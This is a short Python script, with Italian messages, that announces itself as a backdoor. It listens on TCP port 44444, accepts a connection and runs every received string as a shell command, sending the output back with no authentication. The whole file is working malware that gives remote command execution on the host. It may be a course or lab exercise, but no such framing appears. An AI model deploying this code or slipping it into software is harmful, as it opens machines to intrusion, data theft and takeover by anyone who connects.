import socket as soc
import subprocess

SRV_ADDR = ""
SRV_PORT = 44444

s = soc.socket(soc.AF_INET, soc.SOCK_STREAM)
address = (SRV_ADDR, SRV_PORT)
s.bind(address)
s.listen(1)
print(f"Il servizio e' avviato: attendo connessioni in entrata su {SRV_PORT}")
connection, addressClient = s.accept()
print("Sono connesso con l'indirizzo:", addressClient)
connection.sendall(b"Backdoor in attesa di comando!\n")
while True:
    data = connection.recv(1024)
    if not data: break
    command = data.decode("UTF-8")
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
    connection.sendall(result.stdout)
    print(command)
connection.close()